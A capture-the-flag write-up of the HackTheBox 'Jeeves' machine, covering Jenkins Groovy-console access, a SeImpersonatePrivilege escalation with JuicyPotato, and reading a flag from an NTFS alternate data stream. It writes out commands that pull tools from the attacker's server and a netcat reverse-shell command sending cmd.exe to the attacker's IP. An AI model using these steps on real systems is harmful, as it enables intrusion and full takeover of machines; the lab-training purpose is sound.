# Jeeves

## Introduction

Welcome to my another writeup! In this HackTheBox [Jeeves](https://app.hackthebox.com/machines/Jeeves) machine, you'll learn: Exploiting Jenkins, privilege escalation via `SeImpersonatePrivilege`, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: `secnotes\tyler` to `NT AUTHORITY\SYSTEM`](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Jeeves.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Jeeves)-[2023.05.26|15:25:13(HKT)]
└> export RHOSTS=10.10.10.63           
┌[siunam♥earth]-(~/ctf/htb/Machines/Jeeves)-[2023.05.26|15:25:15(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-05-26T12:26:03
|_  start_date: 2023-05-26T12:24:05
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55172/tcp): CLEAN (Timeout)
|   Check 2 (port 13475/tcp): CLEAN (Timeout)
|   Check 3 (port 58987/udp): CLEAN (Timeout)
|   Check 4 (port 48293/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
```

According to `rustscan` result, we have 4 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|80                | Microsoft IIS httpd 10.0      |
|135               | RPC                           |
|445               | SMB                           |
|50000             | Jetty 9.4.z-SNAPSHOT          |

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Jeeves)-[2023.05.26|15:26:34(HKT)]
└> echo "$RHOSTS jeeves.htb" | sudo tee -a /etc/hosts  
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526152811.png)

As you can see, it's the "Ask Jeeves" search engine.

> Ask Jeeves, now known as Ask.com, was a question-and-answer and search engine [business](https://fourweekmba.com/business-strategy/ "business") that was founded in 1996 by David Warthen and Garrett Gruener. (From [https://fourweekmba.com/what-happened-to-ask-jeeves/](https://fourweekmba.com/what-happened-to-ask-jeeves/))

When we search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526153703.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526153711.png)

It outputs an error.

However, it's just a static image:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526154437.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526154554.png)

Nothing useful... I also enumerated hidden directory and file via `gobuster`, but no luck.

### HTTP on Port 50000

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526154648.png)

**According to our `rustscan`'s output, this web application is using Jetty:**
```shell
50000/tcp open  http         syn-ack Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
```

> Jetty provides a web server and servlet container, additionally providing support for HTTP/2, WebSocket, OSGi, JMX, JNDI, JAAS and many other integrations. These components are open source and are freely available for commercial use and distribution. (From [https://www.eclipse.org/jetty/](https://www.eclipse.org/jetty/))

We can see it's version is: 9.4.z-SNAPSHOT

**Then, I tried to use `searchsploit` to find public exploit for that version:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Jeeves)-[2023.05.26|16:01:27(HKT)]
└> searchsploit Jetty
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
Eclipse Jetty 11.0.5 - Sensitive File Disclosure                         | java/webapps/50478.txt
Jetty 3.1.6/3.1.7/4.1 Servlet Engine - Arbitrary Command Execution       | cgi/webapps/21895.txt
Jetty 4.1 Servlet Engine - Cross-Site Scripting                          | jsp/webapps/21875.txt
Jetty 6.1.x - JSP Snoop Page Multiple Cross-Site Scripting Vulnerabiliti | jsp/webapps/33564.txt
jetty 6.x < 7.x - Cross-Site Scripting / Information Disclosure / Inject | jsp/webapps/9887.txt
Jetty 9.4.37.v20210219 - Information Disclosure                          | java/webapps/50438.txt
Jetty Web Server - Directory Traversal                                   | windows/remote/36318.txt
Mortbay Jetty 7.0.0-pre5 Dispatcher Servlet - Denial of Service          | multiple/dos/8646.php
------------------------------------------------------------------------- ---------------------------------
```

However, none of those exploits work.

**Let's enumerate hidden directory and file again:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Jeeves)-[2023.05.26|15:52:58(HKT)]
└> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://jeeves.htb:50000/ -t 40 -x jsp,jspf,jspx,xsp 
[...]
/askjeeves            (Status: 302) [Size: 0] [--> http://jeeves.htb:50000/askjeeves/]
```

Oh! We found directory `/askjeeves`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526160308.png)

Nice! We found a Jenkins application!

> **Jenkins** is an [open source](https://en.wikipedia.org/wiki/Open_source "Open source") [automation](https://en.wikipedia.org/wiki/Automation "Automation") [server](https://en.wikipedia.org/wiki/Server_(computing) "Server (computing)"). It helps automate the parts of [software development](https://en.wikipedia.org/wiki/Software_development "Software development") related to [building](https://en.wikipedia.org/wiki/Software_build "Software build"), [testing](https://en.wikipedia.org/wiki/Test_automation "Test automation"), and [deploying](https://en.wikipedia.org/wiki/Software_deployment "Software deployment"), facilitating [continuous integration](https://en.wikipedia.org/wiki/Continuous_integration "Continuous integration") and [continuous delivery](https://en.wikipedia.org/wiki/Continuous_delivery "Continuous delivery"). It is a server-based system that runs in [servlet containers](https://en.wikipedia.org/wiki/Java_Servlet#Container_servers "Java Servlet") such as [Apache Tomcat](https://en.wikipedia.org/wiki/Apache_Tomcat "Apache Tomcat"). It supports [version control](https://en.wikipedia.org/wiki/Version_control "Version control") tools, including [AccuRev](https://en.wikipedia.org/wiki/AccuRev_SCM "AccuRev SCM"), [CVS](https://en.wikipedia.org/wiki/Concurrent_Versions_System "Concurrent Versions System"), [Subversion](https://en.wikipedia.org/wiki/Subversion_(software) "Subversion (software)"), [Git](https://en.wikipedia.org/wiki/Git_(software) "Git (software)"), [Mercurial](https://en.wikipedia.org/wiki/Mercurial "Mercurial"), [Perforce](https://en.wikipedia.org/wiki/Perforce "Perforce"), [ClearCase](https://en.wikipedia.org/wiki/ClearCase "ClearCase") and [RTC](https://en.wikipedia.org/wiki/Rational_Team_Concert "Rational Team Concert"), and can execute [Apache Ant](https://en.wikipedia.org/wiki/Apache_Ant "Apache Ant"), [Apache Maven](https://en.wikipedia.org/wiki/Apache_Maven) and [sbt](https://en.wikipedia.org/wiki/Sbt "Sbt") based projects as well as arbitrary [shell scripts](https://en.wikipedia.org/wiki/Shell_script "Shell script") and Windows [batch commands](https://en.wikipedia.org/wiki/Batch_file "Batch file"). (From [https://en.wikipedia.org/wiki/Jenkins_(software)](https://en.wikipedia.org/wiki/Jenkins_(software)))

## Exploitation

**We can Google "Jenkins reverse shell", and you should found [this blog](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6).**

In that blog, we can go to "Manage Jenkins" -> "Script Console" to use the Groovy Script console. This console allows a user to run commands for automation and reporting using a groovy script.

**Let's get a reverse shell!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526160947.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526161007.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526161032.png)

- Generate a Groovy reverse shell: (From [revshells.com](https://www.revshells.com/))

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526161228.png)

- Setup a `nc` listener:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Jeeves)-[2023.05.26|16:11:24(HKT)]
└> rlwrap -cAr nc -lnvp 443
listening on [any] 443 ...
```

- Run the payload:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526161302.png)

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Jeeves)-[2023.05.26|16:11:24(HKT)]
└> rlwrap -cAr nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.63] 49677
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami && ipconfig /all
whoami && ipconfig /all
jeeves\kohsuke

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Jeeves
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-03-3A
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.63(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{4079B648-26D5-4A56-9108-2A55EC5CE6CA}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #3
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

I'm user `kohsuke` in host `jeeves`!

**user.txt:**
```shell
C:\Users\Administrator\.jenkins>cd c:\users\kohsuke\desktop
cd c:\users\kohsuke\desktop

c:\Users\kohsuke\Desktop>type user.txt
type user.txt
{Redacted}
c:\Users\kohsuke\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.63
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{4079B648-26D5-4A56-9108-2A55EC5CE6CA}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

## Privilege Escalation

### `jeeves/kohsuke` to `SYSTEM`

Let's enumerate!

**systeminfo:**
```shell
c:\Users\kohsuke\Desktop>systeminfo
systeminfo

Host Name:                 JEEVES
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
[...]
System Type:               x64-based PC
[...]
```

This machine is **x64 Windows 10 Pro 10.0.10586 N/A Build 10586**.

**Check local user:**
```shell
c:\Users\kohsuke\Desktop>net user
net user

User accounts for \\JEEVES

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
kohsuke                  
```

- Only 1 local user: `kohsuke`.

```shell
c:\Users\kohsuke\Desktop>net user kohsuke
net user kohsuke
User name                    kohsuke
[...]
Local Group Memberships      *Users                
```

This user is inside the `Users` group.

**Extract patchs and updates:**
```shell
c:\Users\kohsuke\Desktop>wmic qfe
wmic qfe
Caption                                     CSName  Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  
http://support.microsoft.com/?kbid=3150513  JEEVES  Update                        KB3150513               NT AUTHORITY\SYSTEM  10/26/2017                                      
http://support.microsoft.com/?kbid=3161102  JEEVES  Update                        KB3161102               NT AUTHORITY\SYSTEM  10/25/2017                                      
http://support.microsoft.com/?kbid=3172729  JEEVES  Security Update               KB3172729               NT AUTHORITY\SYSTEM  10/25/2017                                      
http://support.microsoft.com/?kbid=3173428  JEEVES  Update                        KB3173428               NT AUTHORITY\SYSTEM  10/25/2017                                      
http://support.microsoft.com/?kbid=4021702  JEEVES  Update                        KB4021702               NT AUTHORITY\SYSTEM  10/26/2017                                      
http://support.microsoft.com/?kbid=4022633  JEEVES  Update                        KB4022633               NT AUTHORITY\SYSTEM  10/25/2017                                      
http://support.microsoft.com/?kbid=4033631  JEEVES  Update                        KB4033631               NT AUTHORITY\SYSTEM  10/26/2017                                      
http://support.microsoft.com/?kbid=4035632  JEEVES  Update                        KB4035632               NT AUTHORITY\SYSTEM  10/25/2017                                      
http://support.microsoft.com/?kbid=4051613  JEEVES  Update                        KB4051613               NT AUTHORITY\SYSTEM  11/4/2017                                       
http://support.microsoft.com/?kbid=4041689  JEEVES  Security Update               KB4041689               NT AUTHORITY\SYSTEM  10/26/2017
```

It's kinda old, maybe we can do **Kernel Exploit**?

**Check `kohsuke` user permission:**
```shell
c:\Users\kohsuke\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name      SID                                        
============== ===========================================
jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Oh! We found something interesting!

**The `SeImpersonatePrivilege` is enabled!!**

**That being said, we can use some `potatoes.exe` to escalate our privilege to `NT AUTHORITY\SYSTEM`!!**

Since the machine's Windows 10 build version (10586) is < Windows 10 1809, I'll use [Juicy Potato](https://github.com/ohpe/juicy-potato).

- Transfer the potato binary:

```shell
┌[siunam♥earth]-(/opt/juicy-potato)-[2023.05.26|16:33:28(HKT)]-[git://master ✗]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
c:\Users\kohsuke\Desktop>powershell iwr -Uri http://10.10.14.26/JuicyPotato.exe -OutFile JuicyPotato.exe
c:\Users\kohsuke\Desktop>.\JuicyPotato.exe
.\JuicyPotato.exe
JuicyPotato v0.1 

Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```

**Execute JuicyPotato to get a SYSTEM privilege shell:**

- Transfer `nc.exe` binary to the target machine:

```shell
┌[siunam♥earth]-(/usr/share/windows-resources/binaries)-[2023.05.26|16:45:56(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
c:\Users\kohsuke\Desktop>powershell iwr -Uri http://10.10.14.26/nc.exe -OutFile nc.exe

c:\Users\kohsuke\Desktop>.\nc.exe -h
[v1.10 NT]
connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
listen for inbound:	nc -l -p port [options] [hostname] [port]
options:
	-d		detach from console, stealth mode

	-e prog		inbound program to exec [dangerous!!]
	-g gateway	source-routing hop point[s], up to 8
	-G num		source-routing pointer: 4, 8, 12, ...
	-h		this cruft
	-i secs		delay interval for lines sent, ports scanned
	-l		listen mode, for inbound connects
	-L		listen harder, re-listen on socket close
	-n		numeric-only IP addresses, no DNS
	-o file		hex dump of traffic
	-p port		local port number
	-r		randomize local and remote ports
	-s addr		local source address
	-t		answer TELNET negotiation
	-u		UDP mode
	-v		verbose [use twice to be more verbose]
	-w secs		timeout for connects and final net reads
	-z		zero-I/O mode [used for scanning]
port numbers can be individual or ranges: m-n [inclusive]
```

- Setup a `nc` listener:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Jeeves)-[2023.05.26|16:51:14(HKT)]
└> rlwrap -cAr nc -lnvp 53
listening on [any] 53 ...
```

- Run the payload:

```shell
c:\Users\kohsuke\Desktop>.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\kohsuke\Desktop\nc.exe -e cmd.exe 10.10.14.26 53" -t *
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\kohsuke\Desktop\nc.exe -e cmd.exe 10.10.14.26 53" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

This will setup a COM server on port 1337 (`-l`), use `cmd.exe` to launch commands (`-p`), using both `CreateProcessWithTokenW` and `CreateProcessAsUser` (`-t *`), using CLSID `{4991d34b-80a1-4291-83b6-3328366b9097}` (`-c`), and command line argument to pass to program (`-a`).

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Jeeves)-[2023.05.26|16:51:14(HKT)]
└> rlwrap -cAr nc -lnvp 53
listening on [any] 53 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.63] 49889
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && ipconfig /all
whoami && ipconfig /all
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Jeeves
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-03-3A
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.63(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{4079B648-26D5-4A56-9108-2A55EC5CE6CA}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #3
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

I'm `nt authority\system`!

## Rooted

**In user `Administrator`'s Desktop directory, we see this:**
```shell
C:\Windows\system32>type c:\users\administrator\desktop\hm.txt
type c:\users\administrator\desktop\hm.txt
The flag is elsewhere.  Look deeper.
```

**In here, we can use `/r` option in `dir` to display Alternate Data Streams (ADS) of the file:**
```shell
C:\Windows\system32> cd c:\Users\administrator\desktop
c:\Users\Administrator\Desktop>dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
```

> Alternate Data Streams (ADS) are a file attribute only found on the [NTFS file system](https://technet.microsoft.com/en-us/library/cc781134(v=ws.10).aspx).
>   
> In this system a file is built up from a couple of attributes, one of them is `$Data`, aka the data attribute. Looking at the regular data stream of a text file there is no mystery. It simply contains the text inside the text file. But that is only the primary data stream.
>  
> This one is sometimes referred to as the unnamed data stream since the name string of this attribute is empty ( `""` ) . So any data stream that has a name is considered alternate. (From [https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams))

Found it!

**To read it, we can use `more` to read it:**
```shell
c:\Users\Administrator\Desktop>more < hm.txt:root.txt:$DATA
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jeeves/images/Pasted%20image%2020230526170524.png)

## Conclusion

What we've learned:

1. Enumerating Hidden Files & Directories
2. Exploiting Jenkins
3. Vertical Privilege Escalation Via Juicy Potato To Exploit `SeImpersonatePrivilege` Privilege